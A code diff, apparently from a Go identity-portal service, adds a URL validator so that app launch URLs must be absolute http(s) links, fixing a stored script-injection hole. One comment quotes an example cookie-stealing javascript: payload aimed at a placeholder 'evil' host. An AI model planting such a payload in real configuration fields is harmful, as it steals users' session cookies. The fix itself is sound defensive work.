@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"net/url"
 	"strconv"
 	"strings"
 	"time"
@@ -496,6 +497,36 @@ func formLoginURL(raw json.RawMessage) string {
 	return pc.LoginURL
 }
 
+// launchableURL returns u when it is a target a browser may safely be sent to,
+// and "" otherwise.
+//
+// The portal navigates to whatever this adapter returns —
+// win.location.replace(launch_url) — and several branches return a URL an
+// administrator typed into the console (home_url, a form app's login_url).
+// Those fields are only length-checked, so "javascript:fetch('https://evil/'+
+// document.cookie)" is storable and was returned verbatim: an operator holding
+// app.update could run script in every portal user's browser, on the portal's
+// own origin. Confirmed against a live instance before this check existed.
+//
+// Only absolute http(s) URLs with a host qualify. A relative path would be a
+// navigation inside the portal rather than a launch, and a scheme-less value
+// cannot be a real application.
+func launchableURL(u string) string {
+	parsed, err := url.Parse(strings.TrimSpace(u))
+	if err != nil {
+		return ""
+	}
+	switch strings.ToLower(parsed.Scheme) {
+	case "http", "https":
+	default:
+		return ""
+	}
+	if parsed.Host == "" {
+		return ""
+	}
+	return u
+}
+
 func (a *portalAppQuerierAdapter) GetAppLaunchURL(ctx context.Context, appID, userID int64) (string, error) {
 	ap, err := a.appModule.Repo.GetByID(ctx, appID)
 	if err != nil {
@@ -503,8 +534,8 @@ func (a *portalAppQuerierAdapter) GetAppLaunchURL(ctx context.Context, appID, us
 	}
 	switch ap.Protocol {
 	case app.ProtocolOIDC:
-		if ap.HomeURL != nil && *ap.HomeURL != "" {
-			return *ap.HomeURL, nil
+		if u := launchableURL(deref(ap.HomeURL)); u != "" {
+			return u, nil
 		}
 		if ap.ClientID != nil {
 			// idp_initiated=1 marks this as a portal app-list launch so /authorize
@@ -526,15 +557,15 @@ func (a *portalAppQuerierAdapter) GetAppLaunchURL(ctx context.Context, appID, us
 		// it) — NOT the mxid_app.login_url column, which stays empty for form
 		// apps. Reading only the column made a configured form app fail with "no
 		// login URL". Fall through to the column/home fallbacks if absent.
-		if u := formLoginURL(ap.ProtocolConfig); u != "" {
+		if u := launchableURL(formLoginURL(ap.ProtocolConfig)); u != "" {
 			return u, nil
 		}
 	}
-	if ap.HomeURL != nil && *ap.HomeURL != "" {
-		return *ap.HomeURL, nil
+	if u := launchableURL(deref(ap.HomeURL)); u != "" {
+		return u, nil
 	}
-	if ap.LoginURL != nil && *ap.LoginURL != "" {
-		return *ap.LoginURL, nil
+	if u := launchableURL(deref(ap.LoginURL)); u != "" {
+		return u, nil
 	}
 	// No resolvable target — for a form-fill app this just means it isn't
 	// configured yet. Sentinel so the handler answers 4xx, not 500.
